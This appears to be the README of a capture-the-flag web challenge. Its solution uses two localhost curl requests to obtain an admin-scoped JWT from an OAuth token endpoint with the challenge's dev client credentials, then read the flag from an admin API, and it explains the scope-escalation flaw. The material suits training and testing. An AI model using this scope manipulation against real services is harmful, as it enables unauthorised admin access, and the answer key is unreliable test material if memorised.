# POOR: Proof of Overwhelming Richness

> docker build -t lh2025/`basename "$PWD"` .

Run with the flag

> docker run -e LH_FLAG=FlagTata -p 80:1234 lh2025/`basename "$PWD"`

# Deploy

Only give URL of the server, no explanation.

## Category

Hack


## Difficulty

Medium (easy with enough OAUTH/JWT/JWT-Token knowledge)

## Solve

- Get a (dev) JWT token with the dev "client", but reduce the scope

> curl --request POST \
--url http://localhost/cognito-proxy/oauth2/token \
--data grant_type=client_credentials \
--data client_id=1qconf4f2v146v0qi6kjn25l3m \
--data client_secret=ni1e9k9a25vp5eq2karankjn6atroof1r354s7havetpjunkj2d \
--data scope=admin/all  

- Use the token to get the flag (private bitcoin key)
> curl --request GET \
--url http://localhost/api/admin/bitcoin \
--header 'Authorization: Bearer $TOKEN' 


## Challenger path

Go on home page, see client/secret for dev and example usage (with the header)
Analyse /clients call to "discover" prod client/secret
Play with the api and see that prod can't get the flag, but the flag is only on prod
Understand that the env/dev header should match the scope
See that prod don't use the header or scope
"Unscope" the dev client to remove "env/dev" and keep the "admin/all" scope


## Possible improvement

- clean code (very ugly, but works)
- docker compose, to separate cognito and the api 
- use a real RS key (so JWT is still ok after restart)
- add some noise to avoid LLM/Burp/Random tools to find the flag to quickly ?

## Env variable
- 
- LH_FLAG: flag to be displayed
- LH_SERVER_PORT: port to be used (default 1234)
- LH_SERVER_ADDRESS: 127.0.0.1 or 0.0.0.0
- LH_COGNITO_ISSUER: issuer of the cognito (if we want to change it)
- LH_COGNITO_KID: key id of the cognito (if we want to change it)